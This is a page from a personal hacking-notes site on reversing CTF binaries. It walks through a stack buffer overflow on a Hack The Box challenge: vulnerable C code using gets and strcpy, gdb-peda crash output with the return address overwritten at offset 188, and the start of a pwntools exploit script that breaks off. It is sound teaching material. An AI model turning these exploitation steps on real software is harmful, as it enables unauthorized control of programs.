<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Hacking/Playbooks/Reversing" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Reversing | agalera.eu</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://www.agalera.eu/docs/playbooks/reversing"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Reversing | agalera.eu"><meta data-rh="true" name="description" content="There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both)."><meta data-rh="true" property="og:description" content="There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both)."><link data-rh="true" rel="canonical" href="https://www.agalera.eu/docs/playbooks/reversing"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/playbooks/reversing" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/playbooks/reversing" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Reversing","item":"https://www.agalera.eu/docs/playbooks/reversing"}]}</script><link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S8VGYBN25C"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-S8VGYBN25C",{anonymize_ip:!0})</script><link rel="stylesheet" href="/docs/assets/css/styles.f96ca0f1.css">
<script src="/docs/assets/js/runtime~main.b4ffad70.js" defer="defer"></script>
<script src="/docs/assets/js/main.697014c8.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><a class="navbar__brand" href="/docs/"><div class="navbar__logo"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">agalera.eu</b></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search"><span aria-label="expand searchbar" role="button" class="search-icon" tabindex="0"></span><input id="search_input_react" type="search" placeholder="Loading..." aria-label="Search" class="navbar__search-input search-bar" disabled=""></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/flight-sim/dcs/f5e">Flight Simulators</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/languages/bash">Hacking</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/languages/bash">Language security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/playbooks/active-directory">Playbooks</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/active-directory">Active Directory</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/file-transfer">File transfer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/improve-shell">Improve shell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/owasp">OWASP TOP 10</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/pentesting-windows">Pentesting Windows</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/pentesting">Pentesting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/playbooks/reversing">Reversing</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/playbooks/sqli">SQL Injections</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/tooling/crackmapexec">Tooling</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/useful-links">Useful links</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb-academy/file-inclusion">Write-ups</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/linux-useful-commands">Linux</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Shortcuts/Chrome">Shortcuts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/">Welcome</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/docs/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Hacking</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Playbooks</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Reversing</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Reversing</h1></header>
<p>There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both).</p>
<p>The first step is to use as a regular user and pay attention to the strings appearing in the UI. Later, we can search those strings in the decompiler.</p>
<p>One useful tool to perform this kind of analysis is <a href="https://github.com/NationalSecurityAgency/ghidra" target="_blank" rel="noopener noreferrer">ghidra</a>.</p>
<p>For instance, you can search for references, memory addresses, search for strings, etc..</p>
<p>Another interesting tool is <code>gdb</code>, the gnu debugger. More on this to come, when i&#x27;m not familiar.</p>
<p>To debug Windows binaries, you can use <code>ollydbg</code>, analyse the code and place the breakpoints in the interesting addresses.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="buffer-overflow">Buffer overflow<a href="#buffer-overflow" class="hash-link" aria-label="Direct link to Buffer overflow" title="Direct link to Buffer overflow">​</a></h2>
<p>In order to understand this attack, first we need to understand how the memory works in the computers.</p>
<p>We first need to understand that memory has the following regions:</p>
<table><thead><tr><th>Memory section</th><th>Description</th></tr></thead><tbody><tr><td>Stack</td><td>stores function local variables and information about function calls: return address, arguments, etc..</td></tr><tr><td>Heap</td><td>stores the dynamic memory. Used by malloc, etc...</td></tr><tr><td>BSS</td><td>stores the uninitialized static/global variables</td></tr><tr><td>Data</td><td>stores the static/global variables</td></tr><tr><td>Text</td><td>read only, stores the executable code</td></tr></tbody></table>
<p>Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:</p>
<table><thead><tr><th>Stack frame section</th><th>Description</th></tr></thead><tbody><tr><td>Function arguments</td><td></td></tr><tr><td>Return address</td><td>where to go when the execution ends</td></tr><tr><td>Previous frame pointer</td><td>to know what is the stack frame of the function calling this function</td></tr><tr><td>Local variables</td><td></td></tr></tbody></table>
<p>Take this functions as example:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;string.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">foo</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">/* The following statement will result in buffer overflow */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">strcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">str </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;This is definitely longer than 12&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">foo</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>The stack frame for foo() will look like this:</p>
<table><thead><tr><th>Stack frame section</th><th>Value</th></tr></thead><tbody><tr><td>Function arguments</td><td>str (pointer)</td></tr><tr><td>Return address</td><td></td></tr><tr><td>Previous frame pointer</td><td></td></tr><tr><td>Local variables</td><td>buffer[11]<br><br>...<br>buffer[1]</td></tr></tbody></table>
<p>In this case, we can keep adding data into the buffer until we reach the memory address of the return address.
Then, we can tell the program to jump to any function that we want.</p>
<p>Knowing that, buffer overflow technique consists in three stages:</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="overflow-the-stack-pointer">Overflow the stack pointer<a href="#overflow-the-stack-pointer" class="hash-link" aria-label="Direct link to Overflow the stack pointer" title="Direct link to Overflow the stack pointer">​</a></h3>
<p>When a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: <code>gets</code> function:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">vuln</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> local_bc </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">180</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">gets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">local_bc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">local_bc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="reach-to-the-return-address">Reach to the return address<a href="#reach-to-the-return-address" class="hash-link" aria-label="Direct link to Reach to the return address" title="Direct link to Reach to the return address">​</a></h3>
<p>Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.</p>
<p>In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.</p>
<p>Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.</p>
<p>You can do it in a less manual way using <code>gdb-peda</code>:</p>
<p>Knowing that the buffer has 180 chars, let&#x27;s suppose that will 200 chars will overflow it, let&#x27;s create a pattern of 200 chars:</p>
<p><code>pattern_create 200 bof.txt</code></p>
<p>and input it to the program:</p>
<p><code>r &lt; pattern.txt</code></p>
<p>When the program crashes, we&#x27;ll see the registers:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">You know who are 0xDiablos: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[----------------------------------registers-----------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EAX: 0xc9 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EBX: 0x76414158 (&#x27;XAAv&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ECX: 0xf7fa09b4 --&gt; 0x0 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EDX: 0x1 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ESI: 0xffffcf94 --&gt; 0xffffd165 (&quot;/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EDI: 0xf7ffcb80 --&gt; 0x0 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EBP: 0x41594141 (&#x27;AAYA&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ESP: 0xffffceb0 (&quot;ZAAxAAyA&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EIP: 0x41417741 (&#x27;AwAA&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-------------------------------------code-------------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Invalid $PC address: 0x41417741</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[------------------------------------stack-------------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000| 0xffffceb0 (&quot;ZAAxAAyA&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0004| 0xffffceb4 (&quot;AAyA&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0008| 0xffffceb8 --&gt; 0xf7fbeb00 --&gt; 0xf7d8fcd4 (&quot;GCC_3.0&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0012| 0xffffcebc --&gt; 0x3e8 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0016| 0xffffcec0 --&gt; 0xffffcee0 --&gt; 0x1 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0020| 0xffffcec4 --&gt; 0xf7f9f000 --&gt; 0x229dac </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0024| 0xffffcec8 --&gt; 0xf7ffd020 --&gt; 0xf7ffda40 --&gt; 0x0 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0028| 0xffffcecc --&gt; 0xf7d96519 --&gt; 0x8310c483 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[------------------------------------------------------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Legend: code, data, rodata, value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x41417741 in ?? ()</span><br></span></code></pre></div></div>
<p>The interesting one is <code>EIP</code> as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.</p>
<p>Now, we can use <code>pattern_offset</code> to obtain exactly the number of characters to reach to Return address:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ pattern_offset 0x41417741</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1094809409 found at offset: 188</span><br></span></code></pre></div></div>
<p>Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="write-the-exploit">Write the exploit<a href="#write-the-exploit" class="hash-link" aria-label="Direct link to Write the exploit" title="Direct link to Write the exploit">​</a></h3>
<p>In the case I&#x27;m working on the exploit just need to call another function in the code. In order to so, I&#x27;ll use python <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener noreferrer"><code>pwntools</code></a> which helps a lot on these kind of things.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">update</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">arch</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;i386&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> os</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;linux&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">elf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./vuln&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># offset to reach right before return address&#x27;s location</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span 